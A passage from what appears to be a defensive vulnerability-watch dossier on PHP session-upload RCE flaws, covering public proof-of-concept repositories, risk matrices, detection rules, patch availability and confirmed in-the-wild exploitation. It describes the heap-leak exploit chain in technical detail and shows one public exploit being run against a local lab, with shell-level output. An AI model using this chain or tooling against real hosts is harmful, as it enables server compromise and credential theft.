PoC repos **241 → 254 (+13)**. `ikow` **832→857★**, **`NCSC-NL/php2shell` 83→96★**,
**`HOSTED-POWER/php_uploadprogress_guard` 53★** (a defensive C-level guard — good sign),
`JoasASantos/php2shell-scanner` **36→43★**. watchtowr and huntress edited.

Defensive-tooling adoption continues to outpace growth in offensive tools, which is the
healthier of the two trends.

### 17.4 Unchanged
KEV **NO** · no PHP re-spin · NVD `Modified` · Debian unchanged (trixie fixed, bookworm
vulnerable) · EPSS still unpopulated.

## 18. 🚨 MAJOR UPDATE — 2026-10-22 02:55 UTC — PUBLIC AUTOMATED RCE PUBLISHED

### 18.1 What happened
`9bie/php2shell-bypass-aslr-exp` went **101★ → 560★** and is now the **most-starred
php2shell repository in the index** (above NCIA-NL and every defensive repo). It ships
working tooling, not research notes.

Repo contents (21 MB, Python, pushed 2026-10-22T02:41):
`exploit.py` (25 KB) · `ASLR_PURE_HTTP.md` · `HTTP_HEAP_LEAK.md` · `ASLR_PATHS.md` ·
`DISPLAY_ERRORS_OFF.md` · `NO_DISPLAY_ERRORS.md` · `NOASLR_REPORT.md` · `docker/` ·
`lab/` · `src/` · `tools/`

### 18.2 Verified capability claims (from its own READMEs, EN + ZH)
| Claim | Detail |
|---|---|
| Target | **PHP 8.4.26 + Apache prefork + mod_php**, official `php:8.4.26-apache` |
| Constraints | **Fully remote, HTTP-only. No `session_start()` required on the target page. No PHP written to the target.** |
| Reliability | **3/3 one-shot success** on the official image; proof `uid=33(www-data)` |
| **Barrier removed** | **Auto-extracts per-build offsets** (`zif_system`, `zval_ptr_dtor`) from the container's `libphp.so` on first run. The "requires a known binary / per-build profile" gate that previously limited public exploitation **no longer exists**. |
| Automation | Worker rotation, two-stage heap leak, `zif_system` call, proof retrieval, per-stage retries — one command |
| Config | Lab uses `memory_limit=8M`; README states **default config still works** |

### 18.3 The critical qualifier — exposure tiering
**Current version requires `display_errors=1`.**

- With `display_errors=On` at startup → **public off-the-shelf RCE**. TF
- With `display_errors=Off` → **pure-HTTP heap leak works**, but the complete RCE
  implementation is **not published**. The referenced `Karasawa2025/php2shell-lab` (6★) is
  a Fermat joke: *"I am certain I have discovered a truly marvelous RCE method with
  display_errors=0, which this Git repository is too small to contain."*

**Why `display_errors=On` is a large population, not an edge case:** PHP's compiled
default for `display_errors` is **On**. Many installs never override it — the official
PHP Docker images ship without an active `php.ini`, and plenty of distro packages default
permissively. Deployments that never tuned this are now in the trivially-exploitable tier.

### 18.4 Revised risk matrix
| Host configuration | Exploitability (public tooling) | Priority |
|---|---|---|
| Unpatched + `display_errors=On` | **Trivial — one command** | **Emergency** |
| Unpatched + `display_errors=Off` | Reliable **heap disclosure**; RCE requires private work / thin remaining barrier | Critical |
| Patched (8.2.35/8.3.36/8.4.27/8.5.12) | Not affected by these CVEs | Maintain |
| Patched but workers not restarted | Still exposed — stale state survives | **Check now** |

### 18.5 Immediate actions
1. **Confirm `display_errors=Off` in every php.ini / pool config** — this is now a
   materially risk-reducing control, not mere hygiene. Verify the *effective* value at
   startup (`.htaccess`/`php_value` can override; test with a phpinfo page on a canary).
2. **Patch, then restart workers** — unchanged, still the only complete fix.
3. Re-scan with `openai/php2shell-checker` to identify unpatched hosts.
4. Expect mass scanning to increase now that one command works; the detection package's
   arm/leak signatures will see more traffic.

### 18.6 What this does NOT change
- Detection content remains valid — request shapes and log artifacts are unchanged.
- The CVEs, patch versions, and mitigation guidance are unchanged.
- No KEV addition yet.

**Watch next (re-prioritised):** a published **`display_errors=0` full-chain** exploit —
that would move hardened production into the trivial tier. Also: KEV, PHP reconfirmation,
Debian bookworm backport.

## 19. HOURLY WATCH UPDATE — 2026-10-22 03:55 UTC — `display_errors=0` disclosure chain is public

### 19.1 Upgrade to §18.3: the heap-disclosure chain is not just "working" — it's published
§18.3 said that for `display_errors=Off` the pure-HTTP heap leak works but the full RCE is
not published. Reviewing `DISPLAY_ERRORS_OFF.md` (23.5 KB) inside the 9bie repo shows the
**leak chain is complete, documented, and empirically tested**:

| Stage | Mechanism |
|---|---|
| Primitive | Force OOM inside `php_session_send_cookie()` → `php_url_encode()`'s `zend_string_safe_alloc(3, 32, 0, 0)`. **No warning/output is needed** — `SG(headers_sent)` stays 0, so it works with all error display suppressed. |
| State residue | OOM lands between `PS(send_cookie)=1` and `=0`, so the 32-char `PS(id)` and `send_cookie=1` survive the bailout. |
| Consumer | Next request's pre-RINIT `MULTIPART_EVENT_END → php_session_rfc1867_cleanup() → php_session_initialize()` passes through the stale `PS(mod_data)` and calls `php_session_send_cookie()` with the **dangling `PS(id)`**. |
| Forge | Two large multipart fields place the cached id chunk on page 510; a forged `zend_string` header at the page-511 offset makes `url_encode` read a controlled large length. |

**Documented results:** `Set-Cookie: PHPSESSID=` carrying **~4,000 decoded bytes / 47 leaked
pointers**, `chunk_base` recovered. **no-ASLR 3/3, ASLR-on 2/2.** Misses return a normal
32-byte cookie with **no crash** (stealthy). **No `session_start()` on the target needed.**

**Consequence:** for `display_errors=Off` hosts, **confidentiality is breached with public,
repeatable tooling** — passwords, session tokens, API keys and certificates belonging to
*other requests on that worker*. Only the final step to code execution remains unpublished.

### 19.2 ✅ Our `PHPSESSID` cookie detector is validated against the real chain
The documented artifact is precisely what `DETECTION-MEMORY-DISCLOSURE.md` keys on:
- A `PHPSESSID` **response** cookie far longer than a real session id (real = 26 chars;
  observed = 1,000 prefix chars + 4,000 decoded bytes)
- Content that is not the `[A-Za-z0-9,-]` session-id alphabet (percent-escapes / binary)

Our rule keys on **length and charset anomaly**, not exploit internals, so it catches this
chain even as the tool changes. **For `display_errors=Off` fleets — where RCE is not yet
public but disclosure is — this is the single most important detection in the package.**

### 19.3 Deployment priority update
1. **`DETECTION-MEMORY-DISCLOSURE.md` — deploy first** (Suricata/ModSecurity response rules
   in `pass,log`, promote to `deny` after baseline). It is the only control that catches the
   published disclosure chain.
2. Patch + restart workers.
3. Confirm `display_errors=Off` (stops the easily-public RCE path) **and** keep the cookie
   detector (stops the disclosure path that survives it).
4. `openai/php2shell-checker` sweep for unpatched inventory.

### 19.4 State of ecosystem this hour
- No KEV addition · NVD unchanged (`Modified`, refs 3/6) · no PHP re-spin · Debian unchanged
- 9bie repo **560→602★ but no new commits since 21 Oct 14:53** — attention, not new code
- `ikow` reappeared in the index at **1,090★** (confirms prior index-flakiness diagnosis)
- `php2shell.com` −7.8 KB (page reorganisation, no new claims)

## 20. 🚨🚨 CRITICAL UPDATE — 2026-10-22 04:55 UTC — public RCE with `display_errors=OFF`

### 20.1 The gap from §19 is closed
`Karasawa2025/php2shell-lab` — previously a Fermat joke ("a truly marvelous method which
this repository is too small to contain") — now ships a **complete, validated exploit**:
`php2shell.py` (24 KB), `REPORT.md` (12.8 KB), `Dockerfile` (9.3 KB, pinned PHP 8.5.4).
It has **6 stars** — negligible visibility, but **capability is what matters, not stars**.

Two modes:
| Mode | Config | Significance |
|---|---|---|
| `final-zero` | `display_errors=On` | stock 128 MiB, `max_multipart_body_parts >= 1902` |
| **`nzd-u8`** | **`display_errors=Off`, `display_startup_errors=Off`** | **Hardened production path — new** |

### 20.2 Validated conditions (their lab)
Ubuntu 26.04 · Apache **2.4.66 prefork** · **ASLR on** · PHP 8.5.4 NTS · mod_php ·
`memory_limit=128M`
Both modes returned `uid=33(www-data) …`, HTTP 200 on dispatch, **live worker afterwards**
(no crash → stealthy). Body sizes ~586 KiB / ~719 KiB; **4–5 requests**. No attacker PHP
file or `.htaccess` needed. Destructor redirected to **`zif_passthru`**.

**`nzd-u8` requirements:**
- `display_errors=Off`, `display_startup_errors=Off` (the recommended hardening)
- stock `output_buffering=4096`; upload progress **enabled**; writable `session.save_path`
- specific phar layout `/k13_<B>/<B>×12/<B>` on disk
- **one prefork worker**, or a way to pin requests to a single child
- 5 requests cold / 4 steady state

### 20.3 What the single-worker requirement actually means
It sounds like a strong mitigation. It is not, because **the attacker controls their own
connection**: HTTP keep-alive pins requests to one child. Multi-worker deployments add
retries and failure cases, not immunity. Traffic-shaped pinning (low-rate, single-connection
attacks) is exactly what a real intrusion looks like.

**⇒ `display_errors=Off` no longer downgrades an unpatched mod_php prefork host out of the
trivially-exploitable tier.** It was the main comfort argument yesterday; it is gone.

### 20.4 Revised risk matrix (supersedes §18.4)
| Host | Public exploitability | Priority |
|---|---|---|
| Unpatched, mod_php prefork, `display_errors=On` | **Trivial** (final-zero, 4 req) | Emergency |
| Unpatched, mod_php prefork, **`display_errors=Off`** | **Public RCE** (nzd-u8, 4–5 req, single-worker pinning) | **Emergency — upgraded** |
| Unpatched, FPM | Application-dependent; same bug family, public chains are mod_php-focused | Critical |
| Unpatched, any SAPI, disclosure only | Public heap leak → secrets/tokens exfiltrated | Critical |
| Patched + workers restarted | Protected | Maintain |
| Patched, workers NOT restarted | Still exposed (stale state survives) | **Check now** |

### 20.5 ✅ Detection already covers this attack shape
Both modes require **`max_multipart_body_parts >= 1902`** → ≥1,902 multipart parts in one
request. Our `zeek/php2shell.zeek` notice **(c) ">100 multipart parts in one request"**
fires far below that, so the published request shape is already inside coverage.

Coverage map for the public exploit families:
| Signal | Rule | Catches |
|---|---|---|
| ≥1,902 multipart parts | Zeek notice (c) | **Both** public RCE chains |
| ~586–719 KiB multipart POST | Suricata size/shape rules | RCE chains |
| Oversized `PHPSESSID` response cookie | `DETECTION-MEMORY-DISCLOSURE.md` | Disclosure chain (all modes) |
| Producer→consumer OOM/log pair | Sigma + Suricata flowint | RCE aftermath |
| `Session object destruction failed` | Sigma (added §15) | FPM chain |

### 20.6 Priority actions
1. **Patch + restart workers** — now the *only* control that removes the RCE risk.
2. **Do not rely on `display_errors=Off`** as risk reduction for unpatched mod_php prefork.
3. Deploy the **multipart part-count** and **PHPSESSID cookie** detections (both already in
   the package; part-count needs Zeek or a Suricata rule with pcre part enumeration).
4. Reduce `max_multipart_body_parts` (was added as OOM mitigation) — it now **also**
   breaks this specific exploit, since it requires ≥1902. Confirm the effective value; a low
   cap is a genuine, cheap break against this published chain.
5. `session.upload_progress.enabled=0` breaks the arm entirely — highest-value config
   mitigation if patching must wait.

**Watch next:** whether other actors pick this up (6★ → if it goes viral, mass exploitation
follows); KEV; a variant that handles multi-worker without pinning; PHP reconfirmation.

## 21. ⚙️ HANDS-ON VERIFICATION OF THE PUBLIC PoCs — 2026-10-22

I executed both public exploit families against their own labs rather than repeating their
claims. Results differ sharply between them, and **one of my earlier statements was
overstated and is corrected here.**

### 21.1 ✅ CONFIRMED: full RCE with `display_errors=On` (Karasawa `final-zero`)
```
$ python3 php2shell.py --target http://127.0.0.1:18080/ok.php --mode final-zero --profile docker
final-zero: RCE CONFIRMED
  chunk=0x757688e00000 lib=0x757685200000 S=0x757688e6c398 pd=0x75768592c462 requests=4
  body: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
```
- **4 HTTP requests**, no authentication, target page is `<?php echo "OK"; ?>` (no
  `session_start()`), **no PHP written to the target**.
- Environment built from the repo's own Dockerfile (Ubuntu 26.04, Apache 2.4.66 prefork,
  PHP 8.5.4 built from the pinned commit, single worker).
- **This is real, working, off-the-shelf RCE.** Treat the "public exploit exists" risk as
  factual, not theoretical.

### 21.2 ❌ NOT REPRODUCED: `display_errors=Off` RCE (Karasawa `nzd-u8`) — CORRECTION
**§20 stated that a validated `display_errors=Off` full RCE was public. That was based on
the repository's README claims, not on execution. I could not reproduce it, and I am
correcting the record.**

Reproduction attempts against the repo's own lab:
1. Container built from their Dockerfile (PHP 8.5.4, single worker, `display_errors=Off`,
   `display_startup_errors=Off` — verified via `php -i`).
2. Blocker #1: the repo **contradicts itself** — `README.md` documents the phar geometry as
   `k13_<B>/<B>×12/<B>`, but `php2shell.py` requests `(B)*15` (15 levels). The shipped
   Dockerfile creates 12 → leak aborts with *"U-8 leak failed (phar layout missing…)"*.
3. Blocker #2: after **rebuilding the geometry to the 15 levels the code expects** (verified
   `HTTP 200` on the exact exploit URL), the leak **still fails**.
4. `mbfl=0x1811BE0` was verified to match our binary exactly, so that is not the cause.

**Corrected assessment:** for `display_errors=Off` the *heap-disclosure* path is publicly
documented and reportedly working (9bie), but **end-to-end RCE on hardened configs is
UNVERIFIED**. It may well be real — the author claims validation — but nobody should plan
around it as established. **Do not repeat my §20 claim as fact.**

### 21.3 ❌ NOT REPRODUCED: 9bie `exploit.py` (and what that taught us)
- Prerequisites were verified **exactly** as required: `display_errors=1`,
  `memory_limit=8M`, `max_input_vars=1000`, `session.upload_progress.enabled=1`,
  `session.use_strict_mode=0`, `save_path=/tmp`, `KeepAlive Off`, **single prefork worker**.
- **The leak primitive FIRES:** the server returns a **4,096-byte `PHPSESSID` response
  cookie** and Apache logs `zend_mm_heap corrupted` with worker aborts. ✅ This directly
  validates our memory-disclosure detection.
- **But the full chain fails**: the heap-leak parser finds **0 heap pointers** in the 4096
  bytes (payload was `LAAAA…` then mostly zeros), and the worker aborts instead of surviving.
- **Root cause — image drift:** the exploit's `bookworm` profile is calibrated for
  **Debian 12 + Apache 2.4.69**. Current registry tags give either **Debian 12 + Apache
  2.4.68** (`…-apache-bookworm`) or **Debian 13 + glibc 2.41 + Apache 2.4.69** (default tag,
  which moved from Debian 12 → Debian 13). Neither matches.
- Also found: its **hardcoded offsets are stale** (dtor `0x613C50` vs actual `0x65EB60` on
  the current image). Its own `docker/offsets.py` correctly auto-derives them — which
  matters, because a user who skips that step gets a silently wrong exploit.

### 21.4 What the verification changes
| Claim | Before | After |
|---|---|---|
| Public RCE exists (display_errors=On) | Asserted from repos | ✅ **Executed and confirmed** |
| Public RCE exists (display_errors=Off) | Asserted from README | ❌ **Unverified — corrected** |
| Leak produces oversized `PHPSESSID` cookie | From research writeups | ✅ **Directly observed** |
| `display_errors=Off` removes RCE risk | No | **Unknown — not proven either way** |
| Exploits work on arbitrary current images | Implied | ❌ **Highly image/calibration-specific** |

**Practical reading:**
1. **Detection is the most robust control we have** — the cookie artefact appeared in our
   lab exactly as our rule expects, while both public exploits failed to complete on
   slightly-different environments. Detection is environment-independent; exploits are not.
2. **Patching and worker restarts remain the only complete fix.**
3. Public exploit reliability is **lower than the GitHub star counts imply**. That lowers
   the predicted rate of mass opportunistic compromise, but not the risk per vulnerable host
   an attacker has calibrated for.
4. Anyone claiming "hardened config is also trivially exploitable" should reproduce it
   end-to-end first.

## 22. 🚨 IN-THE-WILD EXPLOITATION CONFIRMED — INCLUDING BEFORE DISCLOSURE (2026-10-22)

**Source: Amazon Threat Intelligence (MadPot honeypot network), 2026-10-22, corroborated by
BleepingComputer.** This is the first first-party vendor telemetry of exploitation, and it
changes the timeline materially.

### 22.1 The timeline is earlier than the advisory dates
| When (UTC) | What |
|---|---|
| **2026-10-17 (Sat)** | **First PHP2Shell exploitation attempt** observed in MadPot telemetry — **4 days before disclosure**. Originated from an IP on a **commercial anonymization network** (VPN/proxy). Targeting a honeypot from anonymised infrastructure during an embargo "suggests the activity was conducted by a threat actor." |
| ~2026-10-19/20 | **Embargo broke**: details — including both CVE IDs and mitigation advice given to critical-infrastructure providers — leaked online. PHP **accelerated the release** to begin **20 Oct**. |
| **2026-10-21 ~02:00** | Multiple PoC exploits circulating — **~12 hours before the official 14:00 UTC release**. |
| **2026-10-21 02:00–08:00** | **Further exploitation attempts** from *additional* anonymised infrastructure, with *varying payloads* → **multiple distinct actors**. |
| 2026-10-21 07:43 | Cloudflare reports early attacks (matches the above window). |
| 2026-10-22 | AWS states the vulnerabilities are **"now being broadly exploited in the wild."** |

**How the pre-disclosure actor obtained exploit information is unknown** — possible embargo
leak, intelligence sharing to a third party, or independent discovery.

### 22.2 What is NOT established
- Whether the **pre-disclosure attempts succeeded** — AWS says "it's unclear if any of these
  attempts would have succeeded in real-world systems."
- Attribution. Multiple actors, anonymised infrastructure, no named campaign.
- No public IOCs (IPs/payload hashes) released in either write-up.

### 22.3 What this changes for us — three concrete actions
1. **Hunt back to 17 October, not 21 October.** Anyone treating 2026-10-21 as "day zero"
   will miss up to four days of precursor activity. Run the package's hunting queries
   (`04-hunting/hunting-queries-v2.md`) over **2026-10-17 → present**. The behavioural
   signals (OOM/`zend_mm_heap corrupted`, oversized `PHPSESSID`, producer→consumer pairs)
   are valid across that window regardless of which exploit was used.
2. **Treat KEV addition as likely imminent.** "Broadly exploited in the wild" is close to
   the language CISA uses; our standing watch item is now high-probability rather than
   speculative.
3. **CVE-independent detection is now proven correct, not just prudent.** AWS explicitly
   recommends: *"Invest in detections that don't rely on a signature for a specific CVE.
   The first exploitation will often come before those signatures exist."* Our package is
   built exactly that way — behavioural, version-agnostic rules — which is why it would have
   caught Oct 17 activity that no CVE signature could have.

### 22.4 Detection confidence update
The Oct 17–21 activity largely predates public PoCs, meaning it was almost certainly
**targeted, not mass scanning**. Targeted actors are quieter; that raises the value of our
higher-fidelity, lower-volume signals:
- Oversized / non-alphabet `PHPSESSID` response cookie (**highest value** — observed in our
  own lab, tied directly to the documented disclosure primitive)
- `Allowed memory size ... exhausted ... in Unknown on line 0` producer followed by a
  consumer anomaly from the same worker pid within 60 s
- `Session object destruction failed` at PHP Request Startup (FPM chain)

## 23. HOURLY WATCH UPDATE — 2026-10-22 15:55 UTC — EPSS scores published

### 23.1 First quantitative exploitation probability
EPSS populated for both CVEs (previously "no scores yet" — EPSS typically lags 24–48 h):

| CVE | EPSS (30-day) | Percentile |
|---|---|---|
| CVE-2026-109619 | **5.76%** | **93.0th** |
| CVE-2026-109618 | **5.31%** | **92.6th** |

**Reading it honestly:** a typical brand-new CVE sits around 1–2% with a 70–85th percentile
score. **5–6% at the ~93rd percentile is elevated** — consistent with confirmed in-the-wild
exploitation (§22) and the public exploit tooling. It is **not** KEV-grade in EPSS terms
(exploited CVEs commonly score 50%+), which is consistent with "targeted so far, not yet
mass" rather than contradicting it.

**Caveats:** EPSS measures *probability of exploitation in the next 30 days* based on
observed activity, not severity or exploitability on your host. It moves daily and is
currently being driven by the unusual amount of public tooling and media coverage. **Do not
use a ~6% number to deprioritise patching** — for a host where an attacker has calibrated
the exploit (`display_errors=On`, verified RCE in 4 requests), the conditional probability
is effectively 1. EPSS is a population statistic, not a per-host risk score.

### 23.2 KEV still NO (catalog 1,754)
Checked directly. Given AWS's "broadly exploited in the wild" statement (§22), a KEV
addition remains the highest-probability next escalation.

### 23.3 Ecosystem
PoC repos **517 → 534 (+17)**. `NCSC-NL/php2shell` **175→185★** (defensive adoption
continues to lead), `HOSTED-POWER/php_uploadprogress_guard` **86→90★**,
`syhunt/php2shell-protection` **70★**, `Anton-Barinov/php2shell-patches` 48★.
New noisier entrants: `JXJZJWHCM/PHP2Shell-Cyber-EXP` (11★). watchtowr/huntress edited
(non-material).

## 24. MATERIAL UPDATE — 2026-10-22 21:55 UTC — NVD completed analysis; scores split

### 24.1 Both CVEs moved `Modified → Analyzed`
NVD finished its analysis at **2026-10-22T20:45 UTC** (109619) and **20:45:11** (109618).
This is the final NVD state — it also opens the door to SSVC/KEV evaluation.

### 24.2 The scores are no longer identical — this corrects §14 and the START-HERE line
| CVE | Vendor (PHP, CVSS v4.0) | **NIST (CVSS v3.1, primary)** | NIST vector |
|---|---|---|---|
| **CVE-2026-109618** (OOM corruption) | 9.2 CRITICAL | **9.8 CRITICAL** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CVE-2026-109619** (stale global state) | 9.2 CRITICAL | **8.1 HIGH** ← *changed* | `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |

**What changed:** NIST initially scored both at 9.8 with **`AC:L` (low complexity)**. On
completion it re-rated **109619 to `AC:H` (high complexity)**, dropping it to **8.1 HIGH**.
**109618 keeps 9.8 / `AC:L`.**

### 24.3 How to quote this (supersedes §14.1's "9.2 / 9.8" shorthand)
- **CVE-2026-109618:** "vendor 9.2 CRITICAL; NIST 9.8 CRITICAL"
- **CVE-2026-109619:** "vendor 9.2 CRITICAL; **NIST 8.1 HIGH**"
- Combined: **"CVSS 9.2 vendor (both); NIST 9.8 / 8.1"** — do **not** blanket-quote 9.8 for both.

**Why the split matters practically:** many severity frameworks and compliance controls key
off **CVSS ≥ 9.0 = critical/emergency**. Under NIST's v3.1 scoring, **109619 no longer
clears that bar** — even though PHP still rates it 9.2 CRITICAL and it is the CVE for which
in-the-wild FPM RCE has been demonstrated. **Do not let a scoring change trigger a
downgrade in your response**, but expect it to appear in automated severity rationales.

### 24.4 An honest observation about the inconsistency
109618 and 109619 are two arms of the same defect family (state committed before fallible
work; fatal path skips rollback). The vendor rates them identically (9.2). NIST now rates
them 9.8 vs 8.1 — a 1.7-point gap driven by the `AC:L` / `AC:H` call. Reasonable people can
score the same bug differently; the practical lesson is that **neither number is a
substitute for asset-specific exposure** (is the host patched? did workers restart? is
`display_errors` on?). Note also that AWS's telemetry shows real exploitation of this family
— which is the strongest argument that the complexity rating is not the whole story.

### 24.5 Status snapshot (unchanged otherwise)
- **KEV: NO** (catalog 1,754)
- **EPSS:** 109619 5.76% / 109618 5.31%
- No PHP re-spin; Debian unchanged (trixie fixed, bookworm vulnerable)
- PoC repos 622 → 638

## 25. ✅ RESOLVED — 2026-10-22 22:55 UTC — PHP team formally refutes the "second vulnerability"

### 25.1 The definitive statement
The open question tracked from §16.1 (the Fediverse claim that "the 8.5.12 fix is incomplete /
this is a different vulnerability, still works on 8.5.12") is now **closed by the PHP security
team itself**, on oss-security (`2026/10/22/15`, Jakub Zelenka):

> **"This is unrelated issue with minimal impact (crash in one component in slightly unlikely
> scenario). It has nothing to do with the RCE."**

Supporting statement relayed the same day (`2026/10/22/14`, via the Debian PHP maintainer's
tracker):

> *"The PHP team is aware of that report and there are no new plans as of now."*

### 25.2 What this means
- **There is no known unpatched second PHP vulnerability in this family.** The claim was
  over-stated by its author; what exists is an **unrelated, low-impact crash** in one
  component under an unlikely condition.
- **Patched releases close CVE-2026-109618 and CVE-2026-109619 as published.** No hedge needed.
- Our §16.1 assessment ("most likely not a genuine new vulnerability") was directionally
  correct but rested on second-hand reporting; **this is now first-party.**

### 25.3 Why NVD's reference count jumped (109619: 7 → 12)
NVD re-opened 109619 (`Analyzed → Modified`, 21:17 UTC) to attach the **five oss-security
thread posts** (`2026/10/22/14, /15, /16, /19, /20`). They are **mailing-list discussion**:
the PHP team's refutation above, plus several people correctly pointing out that the Wiz
writeup states **PHP 5.4+ is affected** — corroborating our §11 scope (and the 7.4/8.0/8.1
point). **No exploit references were added**, so this is not a KEV precursor signal.

### 25.4 Standing status after resolution
| Item | State |
|---|---|
| CVE-2026-109618 | `Analyzed` · NIST 9.8 (`AC:L`) · vendor 9.2 |
| CVE-2026-109619 | `Modified` (ref re-open) · NIST 8.1 (`AC:H`) · vendor 9.2 |
| Second-vulnerability claim | **REFUTED by PHP security team** |
| KEV | **NO** (catalog 1,754) |
| EPSS | 5.76% (109619) / 5.31% (109618) |
| PHP re-spin | none — 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 remain current |
| In-the-wild | **confirmed**, incl. pre-disclosure from 2026-10-17 (AWS) |

**Net:** the vulnerability set is settled and patched; the remaining risk is **deployment
completeness** (patched? workers restarted? EOL 7.4/8.0/8.1 hosts?) and **detection coverage**
for the confirmed exploitation, not unknown bugs.

### 25.5 Monitoring lesson worth keeping
A single-source social-media claim ("still works on 8.5.12!") drove a full escalation cycle:
captured in the changelog at hour 5, hedged in the dossier, and finally closed by a first-party
statement ~24 h later. The process worked — **but only because the claim was recorded as
unconfirmed rather than repeated as fact.** Keep that pattern: log it, caveat it, watch for
the primary source.

## 26. MATERIAL — 2026-10-23 01:55 UTC — Ubuntu has shipped fixes (USN-8948-1, -2)

### 26.1 Ubuntu patch path is open — including ESM for very old releases
Found while investigating a monitor parse failure. Ubuntu's tracker marks both CVEs
**`active` / priority `critical`**, fixed under **USN-8948-1** and **USN-8948-2**:

| Ubuntu release | Package | Fixed version |
|---|---|---|
| **noble (24.04)** | php8.3 | **8.3.6-0ubuntu0.24.04.13** |
| **jammy (22.04)** | php8.1 | **8.1.2-1ubuntu2.28** |
| focal (20.04) | php7.4 | 7.4.3-4ubuntu2.29+esm5 *(ESM)* |
| bionic (18.04) | php7.2 | 7.2.24-0ubuntu0.18.04.17+esm14 *(ESM)* |
| xenial (16.04) | php7.0 | 7.0.33-0ubuntu0.16.04.16+esm22 *(ESM)* |
| trusty (14.04) | php5 | 5.5.9+dfsg-1ubuntu4.29+esm18 *(ESM)* |
| resolute | php8.5 | 8.5.4-0ubuntu1.5 |
| stonking | php8.5 | 8.5.9-0ubuntu2.1 |

**Why this matters:** Ubuntu is extremely common in enterprise estates, and the ESM rows mean
**Ubuntu users on EOL releases (14.04→18.04) do have a supported patch path** via
Extended Security Maintenance — they are not stuck in the "no official fix" category that
applies to, say, upstream PHP 7.4. This materially narrows the permanent-exposure population.

**Action for Ubuntu fleets:** `sudo apt update && sudo apt install --only-upgrade 'php*'`,
then **restart Apache/php-fpm workers** (an upgrade without a restart leaves stale state
exploitable). Verify with `dpkg -l | grep php` against the table above.

### 26.2 ⚠️ We were blind to this — monitor defect, now fixed
The hourly monitor never reported Ubuntu status. Two bugs, both now corrected:
1. It scraped `notices.json` assuming a **list**; the endpoint now returns
   `{"notices": [...]}`, so the parser crashed silently (`distro.ubuntu.parse=FAIL`).
2. It only examined the **last 40 notices** — the PHP USNs had already scrolled out of that
   window, so even a working parser would have missed them.

Replaced with the **per-CVE API** (`/security/cves/<CVE>.json`), which is deterministic and
returns USN ids plus per-release fixed versions. The notices scrape is retained only as a
backup for a new USN before it is linked to the CVE. **Verified working** — it reproduced the
entire table above on the first run.

**Honest note:** this means Ubuntu patch status was missing from roughly the first 36 hours of
reporting. Debian and upstream PHP were tracked correctly throughout; only the Ubuntu branch
was blind. No other conclusion in the dossier depends on it.

### 26.3 Updated fleet-patch picture
| Distro | Status |
|---|---|
| **Ubuntu** | ✅ **fixed** (USN-8948-1/-2), including ESM through trusty |
| Debian 13 (trixie) | ✅ fixed (`8.4.27-1~deb13u1`) |
| **Debian 12 (bookworm)** | ❌ **still vulnerable** (`8.2.34-1~deb12u1` security pocket) |
| RHEL / Remi repo | ❌ no fix published (switch to distro packages or build from source) |
| Upstream PHP ≤8.1 | ⚠️ no official release — source backports only |

## 27. MATERIAL — 2026-10-23 07:45 UTC — Debian 12 bookworm fixed; package gains clarification + patch matrix

### 27.1 Debian has closed both branches
| Release | Package | Fixed version | Advisory |
|---|---|---|---|
| **trixie (13)** | php8.4 | **8.4.27-1~deb13u1** | **DSA-6574-1** |
| **bookworm (12)** | php8.2 | **8.2.35-1~deb12u1** | **DLA-4848-1** |
| sid | php8.4 | 8.4.27-1 | — |
| forky (14) | php8.4 | 8.4.26-1 — still vulnerable | — |

**Debian 12 was still vulnerable on 21–22 Oct** (§26.3). It is now fixed via a **DLA (Debian
LTS advisory)**, not a DSA — worth knowing for anyone filtering advisory feeds by DSA only.

### 27.2 Docker images verified
Official `library/php` tags published **2026-10-21**: `8.5.12-apache`, `8.4.27-apache`,
`8.3.36-apache`, `8.2.35-apache`. ⚠️ Caution recorded: the floating `php:8.4.x-apache` tag has
moved from Debian 12 → Debian 13, changing glibc and heap behaviour — pin explicit tags/digests.

### 27.3 Two new package documents (user request)
1. **`CLARIFICATION-second-vulnerability-claim.md`** — because the "second unpatched PHP
   vulnerability" claim keeps circulating. Contains the full claim timeline, the ordered
   resolution (Debian maintainer → Canonical → **PHP security team's direct refutation**),
   an established-vs-unestablished table, and a paste-ready reply. Framed for people who have
   not read anything else.
2. **`PATCH-AVAILABILITY.md`** — verified matrix: upstream PHP, EOL backports, **Ubuntu incl.
   ESM to trusty**, Debian (both branches + advisories), Docker tags, RHEL/Remi (marked
   *unverified — check vendor*, deliberately not asserted), applications (patch PHP not the
   app), and copy-paste verification commands. Carries the two traps: **app patching does
   nothing**, and **upgrade without worker restart = still exploitable**.

### 27.4 Updated fleet picture
| Population | Status |
|---|---|
| Upstream PHP 8.2–8.5 | ✅ fixed |
| Upstream 7.4 / 8.0 / 8.1 | ⚠️ source backports only |
| Upstream ≤7.3 | ❌ no fix — migrate/isolate |
| **Ubuntu (incl. ESM)** | ✅ fixed (USN-8948-1/-2) |
| **Debian 13 / 12** | ✅ **fixed (DSA-6574-1 / DLA-4848-1)** |
| Debian forky (14) | ❌ vulnerable |
| RHEL family / Remi | ⚠️ **verify with vendor** (not verified) |
| Docker `library/php` | ✅ fixed tags |
| PHP-embedding appliances | ⚠️ vendor firmware only |

## 28. MATERIAL — 2026-10-23 10:00 UTC — NEW: PHP publishes informational advisory for CVE-2026-115560

### 28.1 What PHP published
A new php.net entry (`2026-10-23-1`), **"Informational advisory: Session upload progress"**, assigns
**CVE-2026-115560** and states a full advisory will follow **with the next regular release**.
No patches were shipped out-of-band.

**Exact conditions for the issue (all three must hold):**
1. The application's configuration sets `session.serialize_handler` to **`php_binary`** or
   **`php_serialize`**, **and**
2. The application switches it to **`php` at runtime** via `ini_set()` **before `session_start()`**, **and**
3. `session.upload_progress.enabled` is still **enabled**.

**PHP's own characterisation:** an **"unlikely RCE vector"**; *"the issue can only occur under an
unusual combination of configuration and application code"*; *"since this setup is unlikely in
practice, we are handling it in the regular release cycle"*.

### 28.2 Mitigation — we already recommend it
PHP's mitigation is **`session.upload_progress.enabled=0`**, which is *already listed* in the
GHSA-6wmf-4rv5-p3rp (CVE-2026-109619) advisory from 21 Oct:

> *"We suggest you set `session.upload_progress.enabled=0` until the next regular bugfix release,
> to fully protect from an unlikely RCE vector. This setting was already listed as a mitigation in
> the GHSA-6wmf-4rv5-p3rp advisory for CVE-2026-109619 published on Oct 21st, 2026. **If you applied
> it then, keep it in place and no further action is needed.**"*

**Our package already puts `session.upload_progress.enabled=0` first in the containment order**
